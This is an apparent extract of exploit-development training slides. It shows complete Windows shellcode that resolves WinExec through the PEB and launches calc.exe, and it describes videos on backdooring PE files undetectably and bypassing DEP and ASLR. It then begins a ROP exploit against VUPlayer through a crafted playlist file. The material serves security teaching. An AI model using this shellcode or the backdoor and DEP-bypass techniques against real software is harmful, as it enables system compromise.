XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
In the PE format there are the following structures:
• At RVA 0x78 (offset from the beginning of file image) the 
Export Table is stored. The Export Table contains 
information about all the functions contained in the DLL.
• Export table + 0x14 holds a number of functions that the 
DLL exports.
• Export table + 0x1C is the Address Table which holds all 
the addresses of the exported functions.
5.2.3.1 Traversing More Metadata
|  p.73
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
• Export Table + 0x20 is the Name Pointer Table, where 
pointers to the names of the exported functions are 
stored.
• Export Table + 0x24 is the Ordinal Table, where positions 
of functions in the Address Table are stored.
5.2.3.1 Traversing More Metadata
|  p.74
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Let’s try to figure out what exactly is needed in order to get the 
address of a certain function.
•
First, we find the offset to the PE signature (RVA) (base 
address + 0x3c).
•
We then find the address of the PE signature (base address + 
RVA).
•
Next, we find the RVA of the Export Table (PE signature + 
0x78).
•
Based on the RVA, we find the address of the Export Table 
(base address + RVA of the export table).
•
Then we find the RVA of the Address table (Export table + 
0x1C).
5.2.3.1 Traversing More Metadata
|  p.75
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
•
Next, we find the address of the Address Table (base address 
+ RVA of address table).
•
Then, find the RVA of the Name Pointer Table (Export table + 
0x20).
•
Then, find the Address of the Name Pointer Table (base 
address  + RVA of Name Pointer Table).
•
The last two steps will be finding the RVA of the Ordinal Table 
(Export Table + 0x24).
•
Then we’ll calculate the address of the Ordinal Table (using 
base address + RVA of the ordinal table).
5.2.3.1 Traversing More Metadata
|  p.76
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Next, we need to create a loop. The loop will go through the 
Name Pointer Table (as we have its address) and compare 
each entry to the string “WinExec” while remembering the 
index in the table of the currently checked item. 
When done, we need to find an index of the WinExec 
function in the Ordinal Table (Address of Ordinal + (index 
*2)) – as each record in the table is 2 bytes in size.
5.2.3.1 Traversing More Metadata
|  p.77
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Using the Ordinal number, we go to the Address Table to 
the Address Table + (Ordinal Number * 4) position, as each 
Ordinal Table entry is 4 bytes in size.
Knowing the RVA, we can find the function address by 
adding the RVA to DLL’s base address.
5.2.3.1 Traversing More Metadata
|  p.78
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Let’s start by pushing the “WinExec” string onto the stack. 
We’ll need to remember its location and use it as reference 
for a name that should be found within the DLL.
If you try to simply xor esi and then push esi which contains 
0 after the xor operation, and then push the string 
“WinExec”, you will end up dealing with null bytes. Since the 
stack is 4-byte aligned, we cannot just push Winexec, which 
is 7 bytes.
5.2.3.2 Mitigating Single Null-bytes
|  p.79
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
If you xor a register with itself and then push it, a whole-size 
register is pushed (0x00000000), while we need just one 
„00”.
5.2.3.2 Mitigating Single Null-bytes
|  p.80
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Thus, we will use a trick to place the WinExec\00 string 
onto the stack. Due to the endianness, we can actually 
push: 
So we only need to care about the first push. We cannot 
push 0 directly, but since ASCII is one of the ways that raw 
bytes are interpreted, we can simply push some numbers 
that represent ASCII characters.
\x00cex first, and then push
EniW
|  p.81
5.2.3.2 Mitigating Single Null-bytes
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
If we try to push 0x00636578 (\x00cex), we will deal with 
null bytes again. 
But we can push a number that is incremented by a value of 
choice (that does not contain null bytes).
5.2.3.2 Mitigating Single Null-bytes
|  p.82
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
For example, we can choose 0x01010101. Let’s add it to 
the above value, which results in:
0x00636578 (\x00cex)
+ 0x01010101
--------------------
0x01646679
5.2.3.2 Mitigating Single Null-bytes
|  p.83
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
So, now we need to:
• mov reg, 0x01646679
• sub reg, 0x01010101
• push reg
5.2.3.2 Mitigating Single Null-bytes
|  p.84
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Using this method, we can push single null bytes on the 
stack by smuggling them within simple arithmetic. 
This way, many bad characters restrictions can be avoided 
by pushing “safe” values to a register, then modifying them 
using arithmetic so they reflect the desired ASCII values, 
and at the end, pushing them onto the stack. 
5.2.3.2 Mitigating Single Null-bytes
|  p.85
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
The code for pushing winexec will then look like below.
xor esi, esi
mov esi, 0x01646679 
sub esi, 0x01010101
push esi ; null byte trick
push 456e6957h
mov [ebp-4], esp 
; var4 = "WinExec\x00"
|  p.86
5.2.3.2 Mitigating Single Null-bytes
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Let’s turn our attention back to the function searching 
routine; we need to reflect the structure traversing 
algorithm we just described.
The Winexec name push will be implemented into it too.
5.2.3.3 Searching for the Function
|  p.87
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
mov eax, [ebx + 3Ch]
; RVA of PE signature
add eax, ebx       
; Address of PE signature = base 
address + RVA of PE signature
mov eax, [eax + 78h]
; RVA of Export Table
add eax, ebx 
; Address of Export Table
mov ecx, [eax + 24h]
; RVA of Ordinal Table
add ecx, ebx 
; Address of Ordinal Table
mov [ebp-0Ch], ecx 
; var12 = Address of Ordinal Table
mov edi, [eax + 20h] 
; RVA of Name Pointer Table
add edi, ebx 
; Address of Name Pointer Table
mov [ebp-10h], edi 
; var16 = Address of Name Pointer Table
|  p.88
5.2.3.3 Searching for the Function
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
mov edi, [eax + 20h] 
; RVA of Name Pointer Table
add edi, ebx 
; Address of Name Pointer Table
mov [ebp-10h], edi 
; var16 = Address of Name Pointer 
Table
mov edx, [eax + 1Ch] 
; RVA of Address Table
add edx, ebx 
; Address of Address Table
mov [ebp-14h], edx 
; var20 = Address of Address Table
mov edx, [eax + 14h] 
; Number of exported functions
xor eax, eax 
; counter = 0
|  p.89
5.2.3.3 Searching for the Function
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
.loop:
mov edi, [ebp-10h] 
; edi = var16 = Address of Name Pointer Table
mov esi, [ebp-4] 
; esi = var4 = "WinExec\x00"
xor ecx, ecx
cld  
; set DF=0 => process strings from left to right
mov edi, [edi + eax*4]
; Entries in the Name Pointer Table are 4 bytes long
; edi = RVA Nth entry = Address of Name Table * 4
add edi, ebx       
; edi = address of string = base address + RVA Nth entry
add cx, 8 
; Length of strings to compare (len('WinExec') = 8)
repe cmpsb        
; Compare the first 8 bytes of strings in 
; esi and edi registers. ZF=1 if equal, ZF=0 if not
jz start.found
inc eax 
; counter++
cmp eax, edx    
; check if last function is reached
jb start.loop 
; if not the last -> loop
add esp, 26h      
jmp start.end 
; if function is not found, jump to end
|  p.90
5.2.3.3 Searching for the Function
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
.found:
; the counter (eax) now holds the position of WinExec
mov ecx, [ebp-0Ch]
; ecx = var12 = Address of Ordinal Table
mov edx, [ebp-14h]  
; edx = var20 = Address of Address Table
mov ax, [ecx + eax*2] 
; ax = ordinal number = var12 + (counter * 2)
mov eax, [edx + eax*4] 
; eax = RVA of function = var20 + (ordinal * 4)
add eax, ebx 
; eax = address of WinExec = 
; = kernel32.dll base address + RVA of WinExec
|  p.91
5.2.3.3 Searching for the Function
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
At the end of the resulting shellcode, the address of 
WinExec will be held in EAX. The last thing we need to do is 
push WinExec’s argument (the binary we want to run) onto 
the stack. 
We will also use the second argument, window state in this 
case, and we will use its default value SW_SHOWDEFAULT, 
which can be also passed as the number “10”.
5.2.3.3 Searching for the Function
|  p.92
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
We will push the whole path to the binary. Since it’s perfectly 4-
byte aligned, we will not need to do the push trick – we can 
safely push a zero-valued register and then push the whole path 
in portions of 4 bytes.
xor edx, edx
push edx
; null termination
push 6578652eh
push 636c6163h
push 5c32336dh
push 65747379h
push 535c7377h
push 6f646e69h
push 575c3a43h
mov esi, esp   ; esi -> "C:\Windows\System32\calc.exe"
push 10  ; window state SW_SHOWDEFAULT
push esi ; "C:\Windows\System32\calc.exe"
call eax ; WinExec
|  p.93
5.2.3.4 Finalizing the Shellcode
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
In the end, we will equip the shellcode with its own stack 
frame, as we don’t want to mess the program up – the 
shellcode is quite large, so it is a good practice to keep the 
stack clean after it finishes. 
5.2.3.4 Finalizing the Shellcode
|  p.94
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
We will build a stack frame at the start, save all register 
states before we do anything, and in the end the registers 
will be restored, and the stack frame will be removed.
Let’s add it to the code and stick all the pieces together to 
obtain a working peb-based shellcode.
5.2.3.4 Finalizing the Shellcode
|  p.95
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
[BITS 32]
start:
push eax ; Save all registers
push ebx
push ecx
push edx
push esi
push edi
push ebp
; Establish a new stack frame
push ebp
mov ebp, esp
sub esp, 18h 
; Allocate memory on stack for 
local variables
|  p.96
5.2.4 Source Code
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
xor esi, esi
mov esi, 0x01646679
sub esi, 0x01010101
push esi
push 456e6957h;  push the function name on the stack
mov [ebp-4], esp 
; var4 = "WinExec\x00"
|  p.97
5.2.4 Source Code
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
; Find kernel32.dll base address
xor esi, esi
; esi = 0
mov ebx, [fs:30h + esi]  ; written this way to avoid null bytes
mov ebx, [ebx + 0x0C] 
mov ebx, [ebx + 0x14] 
mov ebx, [ebx]
mov ebx, [ebx]
mov ebx, [ebx + 0x10]
; ebx holds kernel32.dll base address
mov [ebp-8], ebx 
; var8 = kernel32.dll base address
|  p.98
5.2.4 Source Code
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
; Find WinExec address
mov eax, [ebx + 3Ch]
; RVA of PE signature
add eax, ebx       
; Address of PE signature = base address + RVA of PE 
signature
mov eax, [eax + 78h]
; RVA of Export Table
add eax, ebx 
; Address of Export Table
mov ecx, [eax + 24h]
; RVA of Ordinal Table
add ecx, ebx 
; Address of Ordinal Table
mov [ebp-0Ch], ecx 
; var12 = Address of Ordinal Table
mov edi, [eax + 20h] 
; RVA of Name Pointer Table
add edi, ebx 
; Address of Name Pointer Table
mov [ebp-10h], edi 
; var16 = Address of Name Pointer Table
mov edx, [eax + 1Ch] 
; RVA of Address Table
add edx, ebx 
; Address of Address Table
mov [ebp-14h], edx 
; var20 = Address of Address Table
mov edx, [eax + 14h] 
; Number of exported functions
xor eax, eax 
; counter = 0
|  p.99
5.2.4 Source Code
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
.loop:
mov edi, [ebp-10h] 
; edi = var16 = Address of Name Pointer Table
mov esi, [ebp-4] 
; esi = var4 = "WinExec\x00"
xor ecx, ecx
cld  
; set DF=0 => process strings from left to right
mov edi, [edi + eax*4]
; Entries in Name Pointer Table are 4 bytes long
; edi = RVA Nth entry = Address of Name Table * 4
add edi, ebx       
; edi = address of string = base address + RVA Nth entry
add cx, 8 
; Length of strings to compare (len('WinExec') = 8)
repe cmpsb        
; Compare the first 8 bytes of strings in 
; esi and edi registers. ZF=1 if equal, ZF=0 if not
jz start.found
inc eax 
; counter++
cmp eax, edx    
; check if last function is reached
jb start.loop 
; if not the last -> loop
add esp, 26h      
jmp start.end 
; if function is not found, jump to end
|  p.100
5.2.4 Source Code
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
.found:
; the counter (eax) now holds the position of WinExec
mov ecx, [ebp-0Ch]
; ecx = var12 = Address of Ordinal Table
mov edx, [ebp-14h]  
; edx = var20 = Address of Address Table
mov ax, [ecx + eax*2] ; ax = ordinal number = var12 + (counter * 2)
mov eax, [edx + eax*4] 
; eax = RVA of function = var20 + (ordinal * 4)
add eax, ebx 
; eax = address of WinExec = 
; = kernel32.dll base address + RVA of WinExec
|  p.101
5.2.4 Source Code
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
xor edx, edx
push edx
; null termination
push 6578652eh
push 636c6163h
push 5c32336dh
push 65747379h
push 535c7377h
push 6f646e69h
push 575c3a43h
mov esi, esp
; esi -> "C:\Windows\System32\calc.exe"
push 10  
; window state SW_SHOWDEFAULT
push esi 
; "C:\Windows\System32\calc.exe"
call eax 
; WinExec
add esp, 46h
; clear the stack
|  p.102
5.2.4 Source Code
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
.end:
pop ebp 
; restore all registers and exit
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
ret
|  p.103
5.2.4 Source Code
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Upon finishing, it’s time to compile the shellcode using 
nasm, as follows.
We’ll also extract the opcodes in order to paste them into 
the shellcode tester program, as follows.
nasm shellcode.asm –o shellcode.bin
|  p.104
5.2.4 Source Code
python bin2sc.py shellcode.bin
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
We will see that calc appears! However, we have to deal 
with the ugly exit as we don’t have a clear return from the 
shellcode. 
Can you create missing logic?
5.2.4 Source Code
|  p.105
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. There are several 
interesting videos and labs up 
next! 
|  p.106
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
In this video, part one of the 
series, we are going to cover the 
basics of smuggling a backdoor 
code inside a legitimate 
application without changing its 
behavior so that any user of this 
application will not be aware that 
the application he runs contains 
a hidden malicious code.
Backdooring PE Files -
Part 1
|  p.107
Video #1
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
We will try to identify 
unused areas within the 
application so that we 
can place the backdoor 
code there as well. 
Backdooring PE Files -
Part 2
|  p.108
Video #2
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
In this video, we will 
encrypt the shellcode and 
implement a runtime 
decryption logic.
Backdooring PE Files -
Part 3
|  p.109
Video #3
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will 
practice writing and 
executing Windows 
shellcode.
Windows Shellcoding
|  p.110
Hera Lab
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
References
|  p.111
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
References
Index of /pub/nasm/releasebuilds
bin2sc.py
Arwin
windows-exploits/arwin.c
https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
https://gist.github.com/superkojiman/11164279
https://www.fuzzysecurity.com/tutorials/expDev/tools/arwin.rar 
https://github.com/73696e65/windows-exploits/blob/master/arwin.c
|  p.112
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
References
WinExec function
Fuzzy Security - Part 6: Writing W32 shellcode
Basics of Windows Shellcode Writing
https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec
https://www.fuzzysecurity.com/tutorials/expDev/6.html
https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html
|  p.113
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Videos
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
Backdooring PE Files - Part 1
In this video, part one of the series, we are going to cover the basics of 
smuggling a backdoor code inside a legitimate application without changing its 
behavior so that any user of this application will not be aware that the 
application he runs contains a hidden malicious code.
Backdooring PE Files - Part 2
We will try to identify unused areas within the application so that we can place 
the backdoor code there as well. 
|  p.114
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Videos
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
Backdooring PE Files - Part 3
In this video, we will encrypt the shellcode and implement a runtime decryption 
logic.
|  p.115
XDSv1: Section 2, Module 5 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Windows Shellcoding
In this lab, you will practice writing and executing Windows shellcode.
|  p.116
© Caendra Inc. 2019
All Rights Reserved
Windows Return Oriented 
Programming
S e c t i o n  0 2  |  M o d u l e  0 6
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Table of Contents
MODULE 06 | WINDOWS RETURN ORIENTED PROGRAMMING
6.1 Windows Exploit Countermeasures
6.2 Creating ROP with mona.py
|   p.2
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
Exploit protections employed in Windows 7
How to bypass DEP + ASLR using mona and ROP 
chains
|   p.3
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
6.1
Windows Exploit 
Countermeasures
|  p.4
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Modern Windows systems are armed with many solid 
exploit protections. In this course, we will focus on 
Windows exploit countermeasures that are present on 
Windows systems up to Windows 7 32-bit.  
Starting from Windows Vista onwards, ASLR was 
introduced and is turned on by default. Additionally, the NX 
equivalent, DEP (Data Execution Prevention), is present on 
all systems starting from Windows XP. 
|  p.5
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
ASLR and DEP, both introduced in the Linux exploitation 
part, work in a very similar manner on Windows systems. 
On Windows you also might encounter stack cookies. They 
are forced at compile-time (e.g. via /GS switch in Visual 
Studio).
|  p.6
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Also, during compilation of a Windows executable, 
information about support for ASLR needs to be passed to
the compiler. 
Apart from ASLR, another feature of an executable’s
modules might stand on your way to developing a 
functional exploit: Rebase.
|  p.7
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Rebase is a property of DLL modules. 
When an application loads several modules, and there is a 
conflict address (two modules are about to be loaded at the 
same address), the one with the Rebase attribute set to true 
will be moved to another address to avoid the conflict. 
All the relative offsets within the library stays the same, just 
the module base address is changed.
|  p.8
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Although Rebase is not an exploit countermeasure, it is not 
recommended to hardcode addresses of Rebase enabled 
modules as they are likely to change.
|  p.9
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
On the other hand, DEP on Windows is a system-wide 
feature. It can be changed via the control panel or the 
bcdedit utility (requires administrator privileges).
Where VALUE can be one of these four: OptIn, OptOut, 
AlwaysOn or AlwaysOff.
bcdedit.exe /set nx VALUE
|  p.10
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
• OptIn: Only certain system programs / services are 
protected with DEP.
• OptOut: All system programs / services are protected 
with DEP. The administrator can add exceptions from the 
protection.
• AlwaysOn: All programs are protected with DEP.
• AlwaysOff: DEP is off.
|  p.11
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Starting from Windows 7 onwards, DEP is turned on by 
default. From Windows Vista onwards, there’s ASLR. 
Thus, if we would like to exploit software on Windows 7 or 
later, we need to consider that:
• Most system modules will be randomized.
• We cannot execute data from the stack.
|  p.12
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Luckily, Return Oriented Programming is a viable technique 
not only on Linux systems. On Linux, when dealing with 
ASLR and NX together, we needed to construct the return 
payload based on non-radomized data (e.g. GOT
addresses).
On Windows, we can rely on addresses and instructions 
from non-ASLR enabled modules. As their base address is 
always the same, we can hardcode those addresses in 
exploit code.
|  p.13
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Windows ROP chains can be built in the same way as their Linux 
counterparts. A series of gadgets can be built so that data from 
the buffer that is stored on the stack can be manipulated and 
various functions can be called.
However, that’s where things get more difficult. On Linux, in most 
cases we had access to functions like write/read or other, easily 
accessible ones in GOT / PLT. On Windows, most of the utility 
functions are placed inside system DLL’s, which, as we already 
said, are all loaded at randomized addresses.
|  p.14
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
It is very unlikely that a non-ASLR custom application 
module will contain a function that can just pop a shell; 
thus, we will need to call functions from system modules, 
and of course do it right after we calculate the system 
module addresses using the non-ASLR modules. This is 
quite a complex challenge.
Keeping in mind that calling a function on Windows during
an overflow is not a simple task, it is better to refrain from 
trying to create shellcode from Windows gadgets.
|  p.15
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
However, researchers already found several optimal 
scenarios for DEP bypass. There are several functions that 
can be called from within a ROP-chain. Although it is still 
not an easy task, let’s see which functions are best for such 
exploitation scenarios.
First is WinExec(). This is Windows equivalent of system(). 
This function requires just a string to execute.
https://docs.microsoft.com/en-us/Windows/win32/api/winbase/nf-
winbase-winexec
|  p.16
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Another option that requires a more complex approach, is calls 
to functions in WinAPI that circumvent the existing DEP policy. 
The following DEP-bypassing functions can be called through
ROP:
•
VirtualAlloc relies on creating (allocating) a new executable 
memory area. The shellcode is then copied to that address 
and executed.
•
VirtualProtect can alter access protection of a certain memory 
area (e.g. making it executable).
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
|  p.17
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setprocessdeppolicy
https://undocumented.ntinternals.net/
•
Using WriteProcessMemory you can copy the shellcode to an 
executable location and jump to it afterwards.
•
HeapCreate can allocate a portion of the executable heap 
memory, where shellcode can be copied and then executed.
•
SetProcessDEPPolicy can change the DEP policy for a process 
(as the name suggests).
•
NtSetInformationProcess (undocumented) can change the 
DEP policy for the current process. You can browse 
undocumented functions on unofficial websites like this one.
|  p.18
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The following image shows which functions can be called 
against DEP on certain versions of Windows.
https://www.fuzzysecurity.com/tutorials/expDev/images/Big_rop1.png
|  p.19
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As constructing Windows ROP chains is not very different 
from Linux ROP chains, you have an idea of what needs to 
be created. However, manually searching for suitable 
gadgets will take a long time.
Fortunately, the mona.py plugin has a utility that 
automatically helps you build ROP chains. Let’s try to 
exploit a vulnerable software on Windows 7 32-bit with 
default security settings to see the process in action.
|  p.20
6.1 Windows Exploit Countermeasures
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
6.2
Creating ROP with 
mona.py
|  p.21
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We will exploit a vulnerable software named VUPlayer 2.49.
The attack vector is via opening a crafted .m3u playlist file. 
We will use a python script to generate a .m3u file. Then, 
upon each change in the exploit, the file will be regenerated 
by running the python script.
|  p.22
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Before we start, let’s make sure that DEP is turned on for all 
the applications. This time we will use the GUI way. Right-
click on „My computer” (for example, in the Start menu) and 
choose Properties.
|  p.23
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Now select Advanced system settings.
|  p.24
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Then, go to the „Advanced” tab
and click the „Settings” button 
under the „Performance” 
section.
Now go to the „Data Execution 
Prevention” tab and choose the 
second option.
|  p.25
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Finally, let’s restart the machine.
|  p.26
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We start with a simple crash proof of concept that will 
create a .m3u playlist consisting of 2500 A’s. We import the 
struct module, as we will use it later for writing addresses.
|  p.27
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
It is worth creating such files using the command line in 
python so we can see the potential syntax errors.
|  p.28
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We open the VUPlayer using Immunity Debugger and 
navigate to Open Playlist. We’ll then open our exploit.m3u 
file. 
|  p.29
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As expected, we are dealing with a vanilla EIP overwrite. 
Let’s find the offset using mona as we did in previous 
examples.
|  p.30
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The pattern is pasted into the exploit. Remember that you 
can find the pattern in a text file inside the Immunity 
Debugger directory, in a non-truncated form. 
|  p.31
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
After updating the exploit, we open the newly created 
playlist. Note that a restart of the debugged software is 
required, before doing so.
|  p.32
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Mona tells us that the proper offset is at location 1012. 
Let’s confirm it by applying the changes to the exploit. 
|  p.33
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We place BBBB starting at position 1013, as per the mona 
output. We will also pad the remaining bytes with „C”, to 
check if we have available space after the overflow. 
Previously, 2500 characters were used, let’s keep this 
length of buffer.
|  p.34
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We managed to precisely overwrite the EIP. Now that we 
control the EIP, let’s try to redirect the execution flow into 
the stack.
|  p.35
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As usual, at this stage we would like to find a „return to 
stack instruction”. As both EDI and ESP reference the rest 
of our payload, we would like to find an instruction like 
„JMP ESP” or „CALL EDI”. 
|  p.36
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
As we are on Windows 7, ASLR and DEP are turned on. 
Before we start to find any instructions, we need to figure 
out any non-ASLR modules, which will allow us to hardcode 
their addresses.
We use the „!mona modules” command with the additional 
parameters: -cm aslr=false,rebase=false, as follows.
|  p.37
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
There are 4 modules that can help us build the exploit. All 
of them come with the software. 
Regardless of the system exploit protections in place, we 
might be able to reuse code from these modules in order to 
compromise the software.
|  p.38
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Let’s narrow the search criteria to those 4 modules when 
looking for a suitable jump instruction, as follows.
|  p.39
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Some of the addresses contain null bytes, but we can 
choose between a few possible addresses. Let’s choose 
the 0x100222C5 address. 
|  p.40
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We need to adjust the exploit. First, we’ll replace the „BBBB” 
EIP Placeholder with the address of the JMP ESP 
instruction. Also, as it is meant to redirect us to the stack, 
we’ll also change the „C” buffer to a „0xcc” buffer – so there 
will be just breakpoints. 
Normally, we should be able to start executing breakpoints 
upon running the latest .m3u file.
|  p.41
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
The current exploit code is presented below.
|  p.42
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Since DEP is turned on, instead of seeing the usual „INT3 
instruction at X” at the bottom, we are greeted by an access 
violation. We cannot execute any data from the stack.
|  p.43
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
We cannot execute anything that lies on the stack, but like
we did during Linux ROP, we can still put arguments and 
addresses on the stack. 
As the DEP-bypassing functions were already introduced, 
let’s generate a ROP chain using mona and analyze what it 
does step by step.
|  p.44
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Find below the mona command that allows us to search for ROP 
chains within the given modules (those are the modules we 
selected earlier, which do not suport ASLR or Rebase). 
!mona rop -m VUPlayer.exe,BASSWMA.dll,BASSMIDI.dll,BASS.dll
|  p.45
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
Three files were created by mona:
• stackpivot.txt
• rop_suggestions.txt
• rop.txt
• rop_chains.txt
Let’s go to the Immunity Debugger’s directory to see what 
is in their content. 
|  p.46
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
If you take a look at stackpivot.txt, you will see lots of 
instructions that allows us to „ret” to the stack. As you may 
recall, ret takes the address from the top of the stack and 
puts it in EIP. So, if we supply some addresses in the 
current „C” buffer, we will be able to jump to these 
addresses and not to the non-executable stack.
|  p.47
6.2 Creating ROP with mona.py
XDSv1: Section 2, Module 6 - Caendra Inc. © 2019
rop_suggestions.txt contains numerous gadgets sorted by
the purpose they can be used for. For example, the below 
